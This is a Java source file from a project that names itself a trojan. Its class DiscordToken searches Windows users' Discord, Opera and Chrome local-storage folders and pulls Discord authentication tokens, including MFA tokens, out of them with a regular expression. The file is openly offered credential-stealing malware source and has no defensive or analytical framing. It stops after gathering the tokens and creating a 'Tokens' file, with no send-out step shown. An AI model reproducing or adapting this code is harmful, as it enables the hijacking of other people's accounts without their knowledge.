package dev.px.trojan.Files.Grab;

import dev.px.trojan.Files.FileGrabber;
import dev.px.trojan.Util.Directorys;
import dev.px.trojan.Util.OSCheckerJ;

import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DiscordToken implements FileGrabber {

    @Override
    public void execute() throws Exception {
        switch (OSCheckerJ.getOperatingSystemType()) {
            case Windows:
                List<String> paths = new ArrayList<>();
                paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
                paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
                paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
                paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
                paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");

                int cx = 0;
                StringBuilder webhooks = new StringBuilder();
                webhooks.append("TOKEN[S]\n");

                try {
                    for (String path : paths) {
                        File f = new File(path);
                        String[] pathnames = f.list();
                        if (pathnames == null) continue;

                        for (String pathname : pathnames) {
                            try {
                                FileInputStream fstream = new FileInputStream(path + pathname);
                                DataInputStream in = new DataInputStream(fstream);
                                BufferedReader br = new BufferedReader(new InputStreamReader(in));

                                String strLine;
                                while ((strLine = br.readLine()) != null) {

                                    Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                    Matcher m = p.matcher(strLine);

                                    while (m.find()) {
                                        if (cx > 0) {
                                            webhooks.append("\n");
                                        }
                                        webhooks.append(" ").append(m.group());
                                        cx++;
                                    }

                                }
                            } catch (Exception ignored) {
                            }
                        }
                        break;
                    }
                } catch (Exception ignored) {}

                File f = new File("Tokens");
        }
    }
}
